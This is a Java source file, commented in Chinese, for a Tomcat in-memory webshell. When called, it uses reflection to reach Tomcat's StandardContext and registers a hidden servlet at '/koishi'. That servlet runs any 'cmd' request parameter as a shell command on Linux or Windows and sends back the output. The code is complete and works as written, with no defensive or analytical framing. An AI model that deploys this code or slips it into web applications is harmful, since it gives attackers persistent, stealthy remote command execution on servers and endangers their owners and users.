package com.tomcat.memshell.Servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class KoishiMemServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{

            String urlPattern = "/koishi";
            //String urlPattern = "*";
            String servletName = "cirno";
            // 从 request 中获取 servletContext
            ServletContext servletContext = req.getSession().getServletContext();
            // 如果已有此 servletName 的 Servlet，则不再重复添加
            if(servletContext.getServletRegistration(servletName) == null) {
                // 反射获取 context，和 filter 差不多
                Field servletfield = servletContext.getClass().getDeclaredField("context");
                servletfield.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);

                Field contextfield = applicationContext.getClass().getDeclaredField("context");
                contextfield.setAccessible(true);
                StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

/**
 * 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                StandardContext o = null;
                while (o == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);
                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }
 */

                //新建servlet
                //Class<?> classServlet = ClassUtil.getClass(ClassUtil.SERVLET_STRING);
                Servlet servlet = new Servlet() {
                    @Override
                    public void init(ServletConfig servletConfig) throws ServletException {

                    }
                    @Override
                    public ServletConfig getServletConfig() {
                        return null;
                    }
                    @Override
                    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                        String cmd = servletRequest.getParameter("cmd");
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        PrintWriter out = servletResponse.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                    @Override
                    public String getServletInfo() {
                        return null;
                    }
                    @Override
                    public void destroy() {

                    }
                };

           // 使用 Wrapper 封装 Servlet
                Wrapper wrapper = standardContext.createWrapper();
                // 设置为1才会将Servlet添加至容器
                // 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1
                wrapper.setLoadOnStartup(1);
                wrapper.setName(servletName);
                wrapper.setServlet(servlet);
                wrapper.setServletClass(servlet.getClass().getName());
            // 向 children 中添加 wrapper
                standardContext.addChild(wrapper);
            // 添加 servletMappings
                standardContext.addServletMapping(urlPattern, servletName);
                PrintWriter writer = resp.getWriter();
                writer.println("inject KoishiMemServlet success !");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
